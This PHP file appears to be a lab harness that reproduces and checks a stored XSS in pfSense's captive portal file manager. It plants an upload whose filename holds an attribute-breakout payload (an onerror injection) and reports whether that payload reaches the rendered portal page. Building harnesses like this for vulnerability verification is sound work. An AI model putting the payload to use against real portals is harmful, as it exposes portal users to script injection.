<?php

/**
 * pfSense CE 2.9.0-DEVELOPMENT Captive Portal filename XSS gadget.
 * Pin 9363ac5b8651a1c7a333180425ce7719070f95f9.
 * Plant priv page-services-captiveportal-filemanager. Victim is an unauth portal client.
 * Portal origin is not the GUI origin. Does not steal GUI cookies.
 */

require __DIR__ . '/stubs.php';
require __DIR__ . '/pin-src/services_captiveportal_filemanager.php.excerpt.php';
require __DIR__ . '/pin-src/captiveportal.inc.excerpt.php';

ini_set('display_errors', '0');

const WITNESS = 'PFSENSE-CP-FILENAME-XSS-WITNESS';
const PIN_SHA = '9363ac5b8651a1c7a333180425ce7719070f95f9';
const PIN_VERSION = '2.9.0-DEVELOPMENT';
const LAB_ZONE = 'labzone';
const ORACLE_HTML = '/oracle/last.html';
const ORACLE_JSON = '/oracle/last.json';
const CONTROL_FILENAME = 'logo.png';
const TRIGGER_FILENAME = 'captiveportal-logo.png" onerror="PFSENSE-CP-FILENAME-XSS-WITNESS';
const RAW_BREAKOUT = '" onerror="PFSENSE-CP-FILENAME-XSS-WITNESS';

function send_json($status, $payload) {
	http_response_code($status);
	header('Content-Type: application/json; charset=utf-8');
	echo json_encode($payload, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
	exit(0);
}

function send_text($status, $body) {
	http_response_code($status);
	header('Content-Type: text/plain; charset=utf-8');
	echo $body;
	exit(0);
}

function request_json() {
	static $decoded = null;
	static $read = false;
	if ($read) {
		return is_array($decoded) ? $decoded : array();
	}
	$read = true;
	$raw = file_get_contents('php://input');
	if (!is_string($raw) || $raw === '') {
		$decoded = array();
		return $decoded;
	}
	$parsed = json_decode($raw, true);
	$decoded = is_array($parsed) ? $parsed : array();
	return $decoded;
}

function request_filename($fallback) {
	if (isset($_POST['filename']) && is_string($_POST['filename']) && $_POST['filename'] !== '') {
		return $_POST['filename'];
	}
	if (isset($_GET['filename']) && is_string($_GET['filename']) && $_GET['filename'] !== '') {
		return $_GET['filename'];
	}
	$body = request_json();
	if (isset($body['filename']) && is_string($body['filename']) && $body['filename'] !== '') {
		return $body['filename'];
	}
	return $fallback;
}

function lab_wipe_dir($dir) {
	if (!is_dir($dir)) {
		mkdir($dir, 0755, true);
		return;
	}
	$dh = opendir($dir);
	if ($dh === false) {
		return;
	}
	while (($entry = readdir($dh)) !== false) {
		if ($entry === '.' || $entry === '..') {
			continue;
		}
		$path = $dir . '/' . $entry;
		if (is_dir($path)) {
			lab_wipe_dir($path);
			@rmdir($path);
		} else {
			@unlink($path);
		}
	}
	closedir($dh);
}

function lab_reset_fs() {
	global $g;
	lab_wipe_dir($g['captiveportal_path']);
	lab_wipe_dir($g['captiveportal_element_path']);
}

function plant_and_render($client_filename) {
	global $g, $config, $cpzone;

	$cpzone = LAB_ZONE;
	lab_reset_fs();

	$_FILES['new'] = array(
		'name' => $client_filename,
		'tmp_name' => '',
		'size' => 3,
		'error' => 0,
		'type' => 'application/octet-stream',
	);
	$stored = filemanager_upload_stored_name();

	$portal_path = $g['captiveportal_path'] . '/' . $stored;
	$element_path = $g['captiveportal_element_path'] . '/' . $stored;
	$wrote_element = file_put_contents($element_path, 'lab');
	$wrote_portal = file_put_contents($portal_path, 'lab');

	$config = array(
		'captiveportal' => array(
			$cpzone => array(
				'zoneid' => 1,
				'auth_method' => 'local',
				'customlogo' => true,
				'custombg' => true,
				'termsconditions' => '',
				'element' => array(
					array(
						'name' => $stored,
						'size' => 3,
						'content' => base64_encode('lab'),
					),
				),
			),
		),
	);

	$html = get_default_captive_portal_html();
	$logo = get_captive_portal_logo();
	$bg = get_captive_portal_bg();
	$gui_list = filemanager_installed_name_html(array('name' => $stored));

	$img_needle = '<img src="' . $logo . '"/>';
	$raw_breakout = strpos($html, RAW_BREAKOUT) !== false;
	$witness_present = strpos($html, WITNESS) !== false;
	$encoded_logo = htmlspecialchars($logo, ENT_QUOTES);
	$encoded_in_attr = strpos($html, '<img src="' . $encoded_logo . '"/>') !== false;
	$img_raw = strpos($html, $img_needle) !== false;

	$result = array(
		'ok' => true,
		'client_filename' => $client_filename,
		'stored' => $stored,
		'logo_src' => $logo,
		'bg_src' => $bg,
		'gui_list' => $gui_list,
		'html' => $html,
		'img_tag_raw' => $img_raw,
		'witness_present' => $witness_present,
		'raw_breakout' => $raw_breakout,
		'encoded_in_img' => $encoded_in_attr && ($encoded_logo !== $logo),
		'file_exists' => file_exists($portal_path),
		'wrote_portal' => $wrote_portal !== false,
		'wrote_element' => $wrote_element !== false,
		'customlogo' => true,
		'auth_user_field' => strpos($html, 'name="auth_user"') !== false,
		'auth_pass_field' => strpos($html, 'name="auth_pass"') !== false,
		'gui_cookie_theft' => false,
		'portal_origin_not_gui' => true,
	);

	file_put_contents(ORACLE_HTML, $html);
	file_put_contents(ORACLE_JSON, json_encode($result, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE));
	return $result;
}

function oracle_state() {
	$html = '';
	if (is_file(ORACLE_HTML)) {
		$read = file_get_contents(ORACLE_HTML);
		$html = ($read === false) ? '' : $read;
	}
	$payload = array();
	if (is_file(ORACLE_JSON)) {
		$parsed = json_decode((string) file_get_contents(ORACLE_JSON), true);
		if (is_array($parsed)) {
			$payload = $parsed;
		}
	}
	return array(
		'ok' => true,
		'html' => $html,
		'witness_present' => strpos($html, WITNESS) !== false,
		'raw_breakout' => strpos($html, RAW_BREAKOUT) !== false,
		'stored' => isset($payload['stored']) ? $payload['stored'] : '',
		'logo_src' => isset($payload['logo_src']) ? $payload['logo_src'] : '',
		'gui_list' => isset($payload['gui_list']) ? $payload['gui_list'] : '',
		'gui_cookie_theft' => false,
	);
}

function pin_source() {
	$parts = array(
		file_get_contents(__DIR__ . '/pin-src/captiveportal.inc.excerpt.php'),
		file_get_contents(__DIR__ . '/pin-src/services_captiveportal_filemanager.php.excerpt.php'),
		file_get_contents(__FILE__),
	);
	return implode("\n", $parts);
}

$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH);
if (!is_string($path) || $path === '') {
	$path = '/';
}

if ($path === '/ping' || $path === '/health' || $path === '/health.php') {
	send_json(200, array(
		'ok' => true,
		'pong' => 'pong',
		'version' => PIN_VERSION,
		'sha' => PIN_SHA,
		'privilege' => 'page-services-captiveportal-filemanager',
		'victim' => 'unauth-portal-client',
		'gui_cookie_theft' => false,
		'witness' => WITNESS,
		'control_filename' => CONTROL_FILENAME,
		'trigger_filename' => TRIGGER_FILENAME,
	));
}

if ($path === '/source') {
	$src = pin_source();
	if ($src === false || $src === '') {
		send_text(500, 'source-read-failed');
	}
	send_text(200, $src);
}

if ($path === '/control') {
	$filename = request_filename(CONTROL_FILENAME);
	send_json(200, plant_and_render($filename));
}

if ($path === '/trigger') {
	$filename = request_filename(TRIGGER_FILENAME);
	send_json(200, plant_and_render($filename));
}

if ($path === '/oracle') {
	send_json(200, oracle_state());
}

send_json(404, array('error' => 'not-found', 'path' => $path));
